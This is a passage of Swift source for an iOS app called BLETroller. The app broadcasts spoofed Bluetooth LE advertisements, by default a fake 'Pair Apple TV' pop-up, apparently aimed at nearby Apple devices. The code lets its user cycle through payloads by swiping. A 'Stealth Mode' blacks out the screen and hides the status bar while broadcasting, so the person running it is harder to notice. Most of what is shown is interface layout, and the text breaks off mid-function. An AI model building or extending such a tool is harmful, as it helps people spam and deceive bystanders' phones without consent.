import CoreBluetooth
import QuartzCore
import UIKit

private let BLETrollerLastSelectedTargetDefaultsKey = "BLETrollerLastSelectedTarget"
private let BLETrollerPendingQuickActionDefaultsKey = "BLETrollerPendingQuickActionType"
private let BLETrollerQuickActionNotification = Notification.Name("BLETrollerQuickActionNotification")

private enum ObjCBridge {
    static func sendVoid(_ obj: AnyObject, _ sel: Selector) {
        BLETrollerObjCSendVoid(obj, sel)
    }

    static func send(_ obj: AnyObject, _ sel: Selector, object: AnyObject?) {
        BLETrollerObjCSendObject(obj, sel, object)
    }

    static func send(_ obj: AnyObject, _ sel: Selector, uint8: UInt8) {
        BLETrollerObjCSendUInt8(obj, sel, uint8)
    }

    static func activate(_ obj: AnyObject, completion: @escaping (AnyObject?) -> Void) {
        BLETrollerObjCActivateWithCompletion(obj) { error in
            completion(error as AnyObject?)
        }
    }
}
final class StealthModeAlertViewController: UIViewController {
    var onDismiss: (() -> Void)?

    override func viewDidLoad() {
        super.viewDidLoad()
        view.backgroundColor = .systemBackground

        let stack = UIStackView()
        stack.axis = .vertical
        stack.alignment = .center
        stack.spacing = 24
        stack.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(stack)

        let symCfg = UIImage.SymbolConfiguration(pointSize: 72, weight: .semibold)
        let iconView = UIImageView(image: UIImage(systemName: "eye.slash.fill", withConfiguration: symCfg))
        iconView.tintColor = .systemBlue
        stack.addArrangedSubview(iconView)

        let titleLabel = UILabel()
        titleLabel.text = "Stealth Mode"
        titleLabel.font = .systemFont(ofSize: 32, weight: .heavy)
        titleLabel.textColor = .label
        stack.addArrangedSubview(titleLabel)

        let msgLabel = UILabel()
        msgLabel.text = "Hide your screen while broadcasting.\n\nTap with two fingers to exit."
        msgLabel.font = .systemFont(ofSize: 18, weight: .medium)
        msgLabel.textColor = .secondaryLabel
        msgLabel.numberOfLines = 0
        msgLabel.textAlignment = .center
        stack.addArrangedSubview(msgLabel)

        var gotItCfg = UIButton.Configuration.filled()
        gotItCfg.title = "Got It"
        gotItCfg.cornerStyle = .large
        gotItCfg.buttonSize = .large
        gotItCfg.baseBackgroundColor = .systemBlue
        gotItCfg.titleTextAttributesTransformer = UIConfigurationTextAttributesTransformer { incoming in
            var out = incoming
            out.font = .systemFont(ofSize: 18, weight: .bold)
            return out
        }

        let gotItBtn = UIButton(type: .system)
        gotItBtn.configuration = gotItCfg
        gotItBtn.addTarget(self, action: #selector(dismissSelf), for: .touchUpInside)
        stack.addArrangedSubview(gotItBtn)

        NSLayoutConstraint.activate([
            stack.centerXAnchor.constraint(equalTo: view.centerXAnchor),
            stack.centerYAnchor.constraint(equalTo: view.centerYAnchor),
            stack.leadingAnchor.constraint(equalTo: view.leadingAnchor, constant: 32),
            stack.trailingAnchor.constraint(equalTo: view.trailingAnchor, constant: -32),
            gotItBtn.widthAnchor.constraint(equalTo: stack.widthAnchor),
            gotItBtn.heightAnchor.constraint(equalToConstant: 60)
        ])
    }

    @objc private func dismissSelf() {
        dismiss(animated: true) { [weak self] in
            self?.onDismiss?()
        }
    }
}

final class AppleTVWarningViewController: UIViewController {
    var onDismiss: (() -> Void)?
    var onCancel: (() -> Void)?

    override func viewDidLoad() {
        super.viewDidLoad()
        view.backgroundColor = .systemBackground

        let stack = UIStackView()
        stack.axis = .vertical
        stack.alignment = .center
        stack.spacing = 24
        stack.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(stack)

        let warningColor = UIColor.systemRed

        let symCfg = UIImage.SymbolConfiguration(pointSize: 72, weight: .semibold)
        let iconView = UIImageView(image: UIImage(systemName: "exclamationmark.triangle.fill", withConfiguration: symCfg))
        iconView.tintColor = warningColor
        stack.addArrangedSubview(iconView)

        let titleLabel = UILabel()
        titleLabel.text = "Privacy Warning"
        titleLabel.font = .systemFont(ofSize: 32, weight: .heavy)
        titleLabel.textColor = .label
        stack.addArrangedSubview(titleLabel)

        let msgLabel = UILabel()
        msgLabel.text = "Your device name \"\(UIDevice.current.name)\" may be shown to others nearby."
        msgLabel.font = .systemFont(ofSize: 18, weight: .medium)
        msgLabel.textColor = .secondaryLabel
        msgLabel.numberOfLines = 0
        msgLabel.textAlignment = .center
        stack.addArrangedSubview(msgLabel)

        var gotItCfg = UIButton.Configuration.filled()
        gotItCfg.title = "Got It"
        gotItCfg.cornerStyle = .large
        gotItCfg.buttonSize = .large
        gotItCfg.baseBackgroundColor = warningColor
        gotItCfg.titleTextAttributesTransformer = UIConfigurationTextAttributesTransformer { incoming in
            var out = incoming
            out.font = .systemFont(ofSize: 18, weight: .bold)
            return out
        }

        let gotItBtn = UIButton(type: .system)
        gotItBtn.configuration = gotItCfg
        gotItBtn.addTarget(self, action: #selector(dismissSelf), for: .touchUpInside)
        stack.addArrangedSubview(gotItBtn)

        var cancelCfg = UIButton.Configuration.gray()
        cancelCfg.title = "Go Back"
        cancelCfg.cornerStyle = .large
        cancelCfg.buttonSize = .large
        cancelCfg.baseForegroundColor = .secondaryLabel
        cancelCfg.titleTextAttributesTransformer = UIConfigurationTextAttributesTransformer { incoming in
            var out = incoming
            out.font = .systemFont(ofSize: 18, weight: .bold)
            return out
        }

        let cancelBtn = UIButton(type: .system)
        cancelBtn.configuration = cancelCfg
        cancelBtn.addTarget(self, action: #selector(cancelSelf), for: .touchUpInside)
        stack.addArrangedSubview(cancelBtn)

        NSLayoutConstraint.activate([
            stack.centerXAnchor.constraint(equalTo: view.centerXAnchor),
            stack.centerYAnchor.constraint(equalTo: view.centerYAnchor),
            stack.leadingAnchor.constraint(equalTo: view.leadingAnchor, constant: 32),
            stack.trailingAnchor.constraint(equalTo: view.trailingAnchor, constant: -32),
            gotItBtn.widthAnchor.constraint(equalTo: stack.widthAnchor),
            gotItBtn.heightAnchor.constraint(equalToConstant: 60),
            cancelBtn.widthAnchor.constraint(equalTo: stack.widthAnchor),
            cancelBtn.heightAnchor.constraint(equalToConstant: 60)
        ])
    }

    @objc private func dismissSelf() {
        dismiss(animated: true) { [weak self] in
            self?.onDismiss?()
        }
    }

    @objc private func cancelSelf() {
        dismiss(animated: true) { [weak self] in
            self?.onCancel?()
        }
    }
}
final class ViewController: UIViewController, UITextViewDelegate, UIContextMenuInteractionDelegate, CBCentralManagerDelegate {
    private var activeAdvertiser: AnyObject?
    private var centralManager: CBCentralManager?
    private let backgroundContainer = UIView()
    private let backgroundGradient = CAGradientLayer()
    private let mainTitleLabel = UILabel()
    private let toggleButton = UIButton(type: .system)
    private let deviceSelectButton = UIButton(type: .system)
    private let logContainer = UIVisualEffectView(effect: UIBlurEffect(style: .systemChromeMaterial))
    private let consoleTextView = UITextView()
    private var landscapeTitleGuide: UILayoutGuide?
    private var stealthOverlayView: UIView?
    private var portraitConstraints: [NSLayoutConstraint] = []
    private var landscapeConstraints: [NSLayoutConstraint] = []
    private var isBroadcasting = false
    private var selectedDevice: [String: Any] = [:]
    private var dotTimer: Timer?
    private var broadcastDurationTimer: Timer?
    private let radarPulseView = UIView()
    private var dotCount = 0
    private var shouldAutoScrollLog = true
    private var isStealthModeEnabled = false
    private var currentBroadcastDuration: TimeInterval = 0
    private var isDiscoveryLoggingEnabled = false
    private let radarIndicatorDot = UIView()
    private let radarStatusLabel = UILabel()
    private let radarPillButton = UIButton(type: .custom)
    private let logTogglePill = UIVisualEffectView(effect: UIBlurEffect(style: .systemMaterial))
    private var lastStealthSwipeDirection: UISwipeGestureRecognizer.Direction = .left
    private var panStartDirection: UISwipeGestureRecognizer.Direction?
    private var radarPillStackLeadingConstraint: NSLayoutConstraint?
    private var radarPillStackTrailingConstraint: NSLayoutConstraint?
    private var scannerPillCollapseTimer: Timer?
    private var isScannerPillCollapsed = false
    private var hasShownScannerPillHint = false
    private var broadcastDisabledReason: String?
    private var toggleButtonAnimationToken: Int = 0
    private var statusAnimationToken: Int = 0
    private var allTargets: [[String: Any]] = []
    private var privacyCoverView: UIView?
    private var lastCentralState: CBManagerState = .unknown
    private var pendingAutoScroll = false
    private let hasSeenStealthModeAlertDefaultsKey = "HasSeenStealthModeAlert"

    override func viewDidLoad() {
        super.viewDidLoad()
        view.backgroundColor = .systemBackground
        view.tintColor = .systemBlue

        isBroadcasting = false
        shouldAutoScrollLog = true
        isStealthModeEnabled = false
        isDiscoveryLoggingEnabled = false
        lastCentralState = .unknown
        currentBroadcastDuration = 0

        setupInitialSelectedTarget()
        centralManager = CBCentralManager(delegate: self, queue: nil)

        setupUI()
        buildConstraintArrays()
        updateLayout(for: view.bounds.size)
        refreshBroadcastEligibilityUI()
        setupAnimatedSplashScreen()

        NotificationCenter.default.addObserver(self, selector: #selector(handleQuickActionNotification(_:)), name: BLETrollerQuickActionNotification, object: nil)
        setupPrivacyCoverIfNeeded()
        NotificationCenter.default.addObserver(self, selector: #selector(handleAppWillResignActive), name: UIApplication.willResignActiveNotification, object: nil)
        NotificationCenter.default.addObserver(self, selector: #selector(handleAppDidBecomeActive), name: UIApplication.didBecomeActiveNotification, object: nil)
        consumePendingQuickActionIfNeeded()
    }

    deinit {
        NotificationCenter.default.removeObserver(self)
    }

    override func viewDidAppear(_ animated: Bool) {
        super.viewDidAppear(animated)
        if !hasShownScannerPillHint {
            hasShownScannerPillHint = true
            revealScannerPill(forDuration: 2.0)
        }
    }

    override func traitCollectionDidChange(_ previousTraitCollection: UITraitCollection?) {
        super.traitCollectionDidChange(previousTraitCollection)
        if let previousTraitCollection, traitCollection.hasDifferentColorAppearance(comparedTo: previousTraitCollection) {
            updateThemeColors()
        }
    }

    override func viewDidLayoutSubviews() {
        super.viewDidLayoutSubviews()
        CATransaction.begin()
        CATransaction.setDisableActions(true)
        backgroundGradient.frame = backgroundContainer.bounds
        CATransaction.commit()

        if !consoleTextView.textContainer.exclusionPaths.isEmpty {
            consoleTextView.textContainer.exclusionPaths = []
        }
    }

    override var prefersStatusBarHidden: Bool { isStealthModeEnabled }
    override var preferredStatusBarUpdateAnimation: UIStatusBarAnimation { .fade }
    override var prefersHomeIndicatorAutoHidden: Bool { isStealthModeEnabled }
    override var preferredScreenEdgesDeferringSystemGestures: UIRectEdge { isStealthModeEnabled ? .bottom : [] }

    private func setupUI() {
        updateThemeColors()

        backgroundContainer.frame = view.bounds
        backgroundContainer.autoresizingMask = [.flexibleWidth, .flexibleHeight]
        view.addSubview(backgroundContainer)

        backgroundGradient.locations = [0.0, 1.0]
        backgroundGradient.frame = backgroundContainer.bounds
        backgroundContainer.layer.addSublayer(backgroundGradient)

        radarPulseView.backgroundColor = view.tintColor.withAlphaComponent(0.2)
        radarPulseView.layer.cornerRadius = 80
        radarPulseView.translatesAutoresizingMaskIntoConstraints = false
        radarPulseView.isHidden = true
        view.insertSubview(radarPulseView, at: 1)

        mainTitleLabel.font = UIFontMetrics.default.scaledFont(for: UIFont.systemFont(ofSize: 38, weight: .heavy))
        mainTitleLabel.adjustsFontForContentSizeCategory = true
        mainTitleLabel.textColor = .label
        mainTitleLabel.text = "Ready!"
        mainTitleLabel.textAlignment = .center
        mainTitleLabel.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(mainTitleLabel)

        logContainer.effect = UIBlurEffect(style: .systemThickMaterial)
        logContainer.layer.cornerRadius = 24
        logContainer.layer.cornerCurve = .continuous
        logContainer.clipsToBounds = true
        logContainer.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(logContainer)

        consoleTextView.backgroundColor = .clear
        consoleTextView.isEditable = false
        consoleTextView.delegate = self
        consoleTextView.adjustsFontForContentSizeCategory = true
        consoleTextView.translatesAutoresizingMaskIntoConstraints = false
        logContainer.contentView.addSubview(consoleTextView)

        let pillBlur = UIBlurEffect(style: .systemThinMaterial)
        logTogglePill.effect = pillBlur
        logTogglePill.layer.cornerRadius = 16
        logTogglePill.layer.cornerCurve = .continuous
        logTogglePill.clipsToBounds = true
        logTogglePill.translatesAutoresizingMaskIntoConstraints = false
        logTogglePill.contentView.backgroundColor = UIColor.tertiarySystemFill.withAlphaComponent(0.15)
        logContainer.contentView.addSubview(logTogglePill)

        radarPillButton.translatesAutoresizingMaskIntoConstraints = false
        radarPillButton.addTarget(self, action: #selector(toggleDiscoveryLogging), for: .touchUpInside)
        logTogglePill.contentView.addSubview(radarPillButton)

        let pillStack = UIStackView()
        pillStack.axis = .horizontal
        pillStack.spacing = 8
        pillStack.alignment = .center
        pillStack.isUserInteractionEnabled = false
        pillStack.translatesAutoresizingMaskIntoConstraints = false
        radarPillButton.addSubview(pillStack)

        radarIndicatorDot.backgroundColor = .secondaryLabel.withAlphaComponent(0.6)
        radarIndicatorDot.layer.cornerRadius = 4
        radarIndicatorDot.translatesAutoresizingMaskIntoConstraints = false
        pillStack.addArrangedSubview(radarIndicatorDot)

        radarStatusLabel.text = "Radar: Off"
        radarStatusLabel.font = UIFontMetrics.default.scaledFont(for: UIFont.systemFont(ofSize: 12, weight: .black))
        radarStatusLabel.adjustsFontForContentSizeCategory = true
        radarStatusLabel.textColor = .secondaryLabel
        pillStack.addArrangedSubview(radarStatusLabel)

        NSLayoutConstraint.activate([
            radarPillButton.leadingAnchor.constraint(equalTo: logTogglePill.contentView.leadingAnchor),
            radarPillButton.trailingAnchor.constraint(equalTo: logTogglePill.contentView.trailingAnchor),
            radarPillButton.topAnchor.constraint(equalTo: logTogglePill.contentView.topAnchor),
            radarPillButton.bottomAnchor.constraint(equalTo: logTogglePill.contentView.bottomAnchor),

            radarIndicatorDot.widthAnchor.constraint(equalToConstant: 8),
            radarIndicatorDot.heightAnchor.constraint(equalToConstant: 8),
        ])

        logContainer.contentView.bringSubviewToFront(logTogglePill)

        let stealthPan = UIPanGestureRecognizer(target: self, action: #selector(handleStealthPan(_:)))
        view.addGestureRecognizer(stealthPan)

        var selCfg = UIButton.Configuration.gray()
        selCfg.title = selectedDevice["name"] as? String
        selCfg.subtitle = "Tap to change payload"
        selCfg.titleAlignment = .center
        selCfg.cornerStyle = .large
        selCfg.baseBackgroundColor = .tertiarySystemFill
        selCfg.baseForegroundColor = view.tintColor
        selCfg.contentInsets = NSDirectionalEdgeInsets(top: 16, leading: 18, bottom: 16, trailing: 18)
        selCfg.titleTextAttributesTransformer = UIConfigurationTextAttributesTransformer { incoming in
            var out = incoming
            out.font = UIFontMetrics.default.scaledFont(for: UIFont.systemFont(ofSize: 20, weight: .bold))
            return out
        }
        selCfg.subtitleTextAttributesTransformer = UIConfigurationTextAttributesTransformer { incoming in
            var out = incoming
            out.font = UIFontMetrics.default.scaledFont(for: UIFont.systemFont(ofSize: 13, weight: .medium))
            out.foregroundColor = UIColor.secondaryLabel
            return out
        }
        deviceSelectButton.configuration = selCfg
        deviceSelectButton.layer.shadowColor = UIColor.black.cgColor
        deviceSelectButton.layer.shadowOffset = CGSize(width: 0, height: 4)
        deviceSelectButton.layer.shadowOpacity = 0.08
        deviceSelectButton.layer.shadowRadius = 10
        deviceSelectButton.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(deviceSelectButton)

        setupPayloadSwipeGestures()
        setupNestedDropdownMenu()

        var restored = deviceSelectButton.configuration
        restored?.title = selectedDevice["name"] as? String
        deviceSelectButton.configuration = restored

        var tglCfg = UIButton.Configuration.filled()
        tglCfg.title = "Start Broadcasting"
        tglCfg.subtitle = broadcastingSubtitle()
        tglCfg.titleAlignment = .center
        tglCfg.titlePadding = 4
        tglCfg.cornerStyle = .large
        tglCfg.baseBackgroundColor = view.tintColor
        tglCfg.titleTextAttributesTransformer = UIConfigurationTextAttributesTransformer { incoming in
            var out = incoming
            out.font = UIFontMetrics.default.scaledFont(for: UIFont.systemFont(ofSize: 24, weight: .bold))
            return out
        }
        tglCfg.subtitleTextAttributesTransformer = UIConfigurationTextAttributesTransformer { incoming in
            var out = incoming
            out.font = UIFontMetrics.default.scaledFont(for: UIFont.systemFont(ofSize: 14, weight: .medium))
            out.foregroundColor = UIColor.white.withAlphaComponent(0.8)
            return out
        }
        toggleButton.contentHorizontalAlignment = .center
        toggleButton.configuration = tglCfg
        toggleButton.layer.shadowColor = view.tintColor.cgColor
        toggleButton.layer.shadowOffset = CGSize(width: 0, height: 6)
        toggleButton.layer.shadowOpacity = 0.3
        toggleButton.layer.shadowRadius = 12
        toggleButton.addTarget(self, action: #selector(toggleBroadcasting), for: .touchUpInside)
        toggleButton.addInteraction(UIContextMenuInteraction(delegate: self))
        toggleButton.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(toggleButton)

        let overlay = UIView(frame: view.bounds)
        overlay.backgroundColor = .black
        overlay.alpha = 0.0
        overlay.isHidden = true
        overlay.autoresizingMask = [.flexibleWidth, .flexibleHeight]
        let exitGesture = UITapGestureRecognizer(target: self, action: #selector(exitStealthMode))
        exitGesture.numberOfTouchesRequired = 2
        exitGesture.numberOfTapsRequired = 1
        overlay.addGestureRecognizer(exitGesture)
        view.addSubview(overlay)
        stealthOverlayView = overlay

        let resetGesture = UILongPressGestureRecognizer(target: self, action: #selector(handleSecretReset(_:)))
        resetGesture.numberOfTouchesRequired = 2
        resetGesture.minimumPressDuration = 2.0
        view.addGestureRecognizer(resetGesture)
    }

    private func buildConstraintArrays() {
        let safe = view.safeAreaLayoutGuide

        landscapeTitleGuide = UILayoutGuide()
        if let landscapeTitleGuide {
            view.addLayoutGuide(landscapeTitleGuide)
        }

        let leading = radarPillButton.subviews.first!.leadingAnchor.constraint(equalTo: radarPillButton.leadingAnchor, constant: 14)
        let trailing = radarPillButton.subviews.first!.trailingAnchor.constraint(equalTo: radarPillButton.trailingAnchor, constant: -14)
        radarPillStackLeadingConstraint = leading
        radarPillStackTrailingConstraint = trailing

        NSLayoutConstraint.activate([
            logTogglePill.leadingAnchor.constraint(equalTo: logContainer.contentView.leadingAnchor, constant: 10),
            logTogglePill.bottomAnchor.constraint(equalTo: logContainer.contentView.bottomAnchor, constant: -10),

            radarPillButton.subviews.first!.topAnchor.constraint(equalTo: radarPillButton.topAnchor, constant: 6),
            radarPillButton.subviews.first!.bottomAnchor.constraint(equalTo: radarPillButton.bottomAnchor, constant: -6),
            leading,
            trailing,

            consoleTextView.topAnchor.constraint(equalTo: logContainer.contentView.topAnchor, constant: 12),
            consoleTextView.bottomAnchor.constraint(equalTo: logContainer.contentView.bottomAnchor, constant: -12),
            consoleTextView.leadingAnchor.constraint(equalTo: logContainer.contentView.leadingAnchor, constant: 15),
            consoleTextView.trailingAnchor.constraint(equalTo: logContainer.contentView.trailingAnchor, constant: -15),

            radarPulseView.widthAnchor.constraint(equalToConstant: 160),
            radarPulseView.heightAnchor.constraint(equalToConstant: 160),
            radarPulseView.centerXAnchor.constraint(equalTo: mainTitleLabel.centerXAnchor),
            radarPulseView.centerYAnchor.constraint(equalTo: mainTitleLabel.centerYAnchor, constant: 15),
        ])

        portraitConstraints = [
            mainTitleLabel.topAnchor.constraint(equalTo: safe.topAnchor, constant: 25),
            mainTitleLabel.leadingAnchor.constraint(equalTo: safe.leadingAnchor, constant: 20),
            mainTitleLabel.trailingAnchor.constraint(equalTo: safe.trailingAnchor, constant: -20),
            logContainer.topAnchor.constraint(equalTo: mainTitleLabel.bottomAnchor, constant: 25),
            logContainer.bottomAnchor.constraint(equalTo: deviceSelectButton.topAnchor, constant: -18),
            logContainer.leadingAnchor.constraint(equalTo: safe.leadingAnchor, constant: 20),
            logContainer.trailingAnchor.constraint(equalTo: safe.trailingAnchor, constant: -20),
            toggleButton.bottomAnchor.constraint(equalTo: safe.bottomAnchor, constant: -20),
            toggleButton.leadingAnchor.constraint(equalTo: safe.leadingAnchor, constant: 20),
            toggleButton.trailingAnchor.constraint(equalTo: safe.trailingAnchor, constant: -20),
            toggleButton.heightAnchor.constraint(equalTo: safe.heightAnchor, multiplier: 0.14),
            deviceSelectButton.bottomAnchor.constraint(equalTo: toggleButton.topAnchor, constant: -15),
            deviceSelectButton.leadingAnchor.constraint(equalTo: safe.leadingAnchor, constant: 20),
            deviceSelectButton.trailingAnchor.constraint(equalTo: safe.trailingAnchor, constant: -20),
            deviceSelectButton.heightAnchor.constraint(equalTo: toggleButton.heightAnchor, multiplier: 0.86),
        ]

        landscapeConstraints = [
            logContainer.topAnchor.constraint(equalTo: safe.topAnchor, constant: 10),
            logContainer.bottomAnchor.constraint(equalTo: safe.bottomAnchor, constant: -10),
            logContainer.leadingAnchor.constraint(equalTo: safe.centerXAnchor, constant: 10),
            logContainer.trailingAnchor.constraint(equalTo: safe.trailingAnchor, constant: -10),
            toggleButton.bottomAnchor.constraint(equalTo: safe.bottomAnchor, constant: -15),
            toggleButton.leadingAnchor.constraint(equalTo: safe.leadingAnchor, constant: 20),
            toggleButton.trailingAnchor.constraint(equalTo: safe.centerXAnchor, constant: -10),
            toggleButton.heightAnchor.constraint(equalTo: safe.heightAnchor, multiplier: 0.33),
            deviceSelectButton.bottomAnchor.constraint(equalTo: toggleButton.topAnchor, constant: -15),
            deviceSelectButton.leadingAnchor.constraint(equalTo: safe.leadingAnchor, constant: 20),
            deviceSelectButton.trailingAnchor.constraint(equalTo: safe.centerXAnchor, constant: -10),
            deviceSelectButton.heightAnchor.constraint(equalTo: toggleButton.heightAnchor, multiplier: 0.84),
            landscapeTitleGuide!.topAnchor.constraint(equalTo: safe.topAnchor),
            landscapeTitleGuide!.bottomAnchor.constraint(equalTo: deviceSelectButton.topAnchor),
            mainTitleLabel.centerYAnchor.constraint(equalTo: landscapeTitleGuide!.centerYAnchor),
            mainTitleLabel.leadingAnchor.constraint(equalTo: safe.leadingAnchor, constant: 20),
            mainTitleLabel.trailingAnchor.constraint(equalTo: safe.centerXAnchor, constant: -10),
        ]

        NSLayoutConstraint.activate(portraitConstraints)
    }

    private func updateLayout(for size: CGSize) {
        if size.width > size.height {
            NSLayoutConstraint.deactivate(portraitConstraints)
            NSLayoutConstraint.activate(landscapeConstraints)
        } else {
            NSLayoutConstraint.deactivate(landscapeConstraints)
            NSLayoutConstraint.activate(portraitConstraints)
        }
    }

    override func viewWillTransition(to size: CGSize, with coordinator: UIViewControllerTransitionCoordinator) {
        super.viewWillTransition(to: size, with: coordinator)
        coordinator.animate(alongsideTransition: { _ in
            self.updateLayout(for: size)
            self.view.layoutIfNeeded()
        })
    }

    private func updateThemeColors() {
        CATransaction.begin()
        CATransaction.setDisableActions(true)
        backgroundGradient.colors = [UIColor.systemBackground.cgColor, UIColor.secondarySystemBackground.cgColor]
        radarPulseView.backgroundColor = view.tintColor.withAlphaComponent(0.2)
        toggleButton.layer.shadowColor = (isBroadcasting ? UIColor.systemRed : view.tintColor).cgColor
        deviceSelectButton.layer.shadowColor = UIColor.black.cgColor
        CATransaction.commit()
    }

    private func setStatus(_ mainText: String) {
        statusAnimationToken += 1
        let token = statusAnimationToken
        mainTitleLabel.layer.removeAllAnimations()
        UIView.animate(withDuration: 0.15, delay: 0, options: .curveEaseIn) {
            self.mainTitleLabel.transform = CGAffineTransform(translationX: 0, y: -15)
            self.mainTitleLabel.alpha = 0.0
        } completion: { _ in
            guard token == self.statusAnimationToken else { return }
            self.mainTitleLabel.text = mainText
            self.mainTitleLabel.transform = CGAffineTransform(translationX: 0, y: 15)
            UIView.animate(withDuration: 0.5, delay: 0, usingSpringWithDamping: 0.7, initialSpringVelocity: 0.5, options: []) {
                self.mainTitleLabel.transform = .identity
                self.mainTitleLabel.alpha = 1.0
            }
        }
    }

    private func setupInitialSelectedTarget() {
        if let savedTarget = UserDefaults.standard.object(forKey: BLETrollerLastSelectedTargetDefaultsKey) as? [String: Any],
           !savedTarget.isEmpty {
            if (savedTarget["payloadKind"] as? String) == "proximity" {
                selectedDevice = legacyActionTarget(name: "Pair Apple TV", type: 0x06, flags: 0xC0)
            } else {
                selectedDevice = savedTarget
            }
        } else {
            selectedDevice = legacyActionTarget(name: "Pair Apple TV", type: 0x06, flags: 0xC0)
        }
    }

    private func setupPayloadSwipeGestures() {
        deviceSelectButton.isUserInteractionEnabled = true

        let swipeLeft = UISwipeGestureRecognizer(target: self, action: #selector(handlePayloadSwipe(_:)))
        swipeLeft.direction = .left
        deviceSelectButton.addGestureRecognizer(swipeLeft)

        let swipeRight = UISwipeGestureRecognizer(target: self, action: #selector(handlePayloadSwipe(_:)))
        swipeRight.direction = .right
        deviceSelectButton.addGestureRecognizer(swipeRight)

        let swipeUp = UISwipeGestureRecognizer(target: self, action: #selector(handlePayloadSwipe(_:)))
        swipeUp.direction = .up
        deviceSelectButton.addGestureRecognizer(swipeUp)

        let swipeDown = UISwipeGestureRecognizer(target: self, action: #selector(handlePayloadSwipe(_:)))
        swipeDown.direction = .down
        deviceSelectButton.addGestureRecognizer(swipeDown)
    }

    private func payloadMatches(_ a: [String: Any]?, _ b: [String: Any]?) -> Bool {
        guard let a, let b else { return false }
        if NSDictionary(dictionary: a) === NSDictionary(dictionary: b) { return true }
        if String(describing: a["name"] ?? "") != String(describing: b["name"] ?? "") { return false }
        if String(describing: a["payloadKind"] ?? "") != String(describing: b["payloadKind"] ?? "") { return false }
        if (a["type"] as? NSNumber)?.uint8Value != (b["type"] as? NSNumber)?.uint8Value { return false }
        if (a["flags"] as? NSNumber)?.uint8Value != (b["flags"] as? NSNumber)?.uint8Value { return false }
        if (a["model"] as? NSNumber)?.uint16Value != (b["model"] as? NSNumber)?.uint16Value { return false }
        let am = a["manufacturerData"] as? Data
        let bm = b["manufacturerData"] as? Data
        if (am != nil || bm != nil), am != bm { return false }
        return true
    }

    private func validPayloadsForCycling() -> [[String: Any]] {
        allTargets.filter { ($0["disabled"] as? NSNumber)?.boolValue != true }
    }

    private func cyclePayload(byDelta delta: Int) {
        let valid = validPayloadsForCycling()
        if valid.isEmpty { return }

        var idx: Int? = nil
        for i in 0..<valid.count {
            if payloadMatches(valid[i], selectedDevice) { idx = i; break }
        }
        let start = idx ?? 0
        var next = (start + delta) % valid.count
        if next < 0 { next += valid.count }
        applySelectedTarget(valid[next], randomlySelected: false)
    }

    @objc private func handlePayloadSwipe(_ gesture: UISwipeGestureRecognizer) {
        if gesture.view !== deviceSelectButton { return }
        UIImpactFeedbackGenerator(style: .light).impactOccurred()
        switch gesture.direction {
        case .right, .up:
            cyclePayload(byDelta: 1)
        case .left, .down:
            cyclePayload(byDelta: -1)
        default:
            break
        }
    }

    @objc private func handleStealthPan(_ gesture: UIPanGestureRecognizer) {
        if isStealthModeEnabled { return }
        
        let translation = gesture.translation(in: view)
        let velocity = gesture.velocity(in: view)
        let width = view.bounds.width
        let height = view.bounds.height
        
        guard let overlay = stealthOverlayView else { return }
        
        switch gesture.state {
        case .began:
            overlay.layer.removeAllAnimations()
            overlay.isHidden = false
            overlay.alpha = 1.0
            
            if velocity.x < 0 {
                panStartDirection = .left
                overlay.frame = CGRect(x: width, y: 0, width: width, height: height)
                lastStealthSwipeDirection = .left
            } else {
                panStartDirection = .right
                overlay.frame = CGRect(x: -width, y: 0, width: width, height: height)
                lastStealthSwipeDirection = .right
            }
            
        case .changed:
            guard let dir = panStartDirection else { return }
            if dir == .left {
                let newX = max(0, min(width, width + translation.x))
                overlay.frame = CGRect(x: newX, y: 0, width: width, height: height)
            } else {
                let newX = min(0, max(-width, -width + translation.x))
                overlay.frame = CGRect(x: newX, y: 0, width: width, height: height)
            }
            
        case .ended, .cancelled:
            guard let dir = panStartDirection else { return }
            let threshold = width * 0.4
            let shouldSnapShut: Bool
            
            if dir == .left {
                shouldSnapShut = (-translation.x > threshold) || (velocity.x < -500)
            } else {
                shouldSnapShut = (translation.x > threshold) || (velocity.x > 500)
            }
            
            if shouldSnapShut {
                if !UserDefaults.standard.bool(forKey: hasSeenStealthModeAlertDefaultsKey) {
                    UIView.animate(withDuration: 0.3, animations: {
                        let startX = dir == .left ? width : -width
                        overlay.frame = CGRect(x: startX, y: 0, width: width, height: height)
                    }) { _ in
                        overlay.isHidden = true
                    }
                    enterStealthMode(withBroadcast: true)
                } else {
                    isStealthModeEnabled = true
                    setNeedsStatusBarAppearanceUpdate()
                    setNeedsUpdateOfHomeIndicatorAutoHidden()
                    setNeedsUpdateOfScreenEdgesDeferringSystemGestures()
                    
                    UIView.animate(withDuration: 0.35, delay: 0, usingSpringWithDamping: 0.82, initialSpringVelocity: 0.5, options: .curveEaseOut) {
                        overlay.frame = CGRect(x: 0, y: 0, width: width, height: height)
                    } completion: { _ in
                        UIImpactFeedbackGenerator(style: .heavy).impactOccurred()
                        if !self.isBroadcasting {
                            self.startBroadcasting()
                        }
                    }
                }
            } else {
                UIView.animate(withDuration: 0.3, delay: 0, options: .curveEaseOut) {
                    let startX = dir == .left ? width : -width
                    overlay.frame = CGRect(x: startX, y: 0, width: width, height: height)
                } completion: { _ in
                    overlay.isHidden = true
                }
            }
            panStartDirection = nil
            
        default:
            panStartDirection = nil
        }
    }

    private func enterStealthMode(withBroadcast shouldBroadcast: Bool) {
        if isStealthModeEnabled { return }

        if !UserDefaults.standard.bool(forKey: hasSeenStealthModeAlertDefaultsKey) {
            let alertVC = StealthModeAlertViewController()
            alertVC.onDismiss = { [weak self] in
                guard let self = self else { return }
                UserDefaults.standard.set(true, forKey: self.hasSeenStealthModeAlertDefaultsKey)
                UserDefaults.standard.synchronize()
                self.executeEnterStealthMode(withBroadcast: shouldBroadcast)
            }
            alertVC.modalPresentationStyle = .pageSheet
            if #available(iOS 15.0, *) {
                if let sheet = alertVC.sheetPresentationController {
                    sheet.detents = [.large()]
                    sheet.prefersGrabberVisible = true
                    sheet.preferredCornerRadius = 24.0
                }
            }
            present(alertVC, animated: true)
        } else {
            executeEnterStealthMode(withBroadcast: shouldBroadcast)
        }
    }

    private func executeEnterStealthMode(withBroadcast shouldBroadcast: Bool) {
        isStealthModeEnabled = true
        setNeedsStatusBarAppearanceUpdate()
        setNeedsUpdateOfHomeIndicatorAutoHidden()
        setNeedsUpdateOfScreenEdgesDeferringSystemGestures()

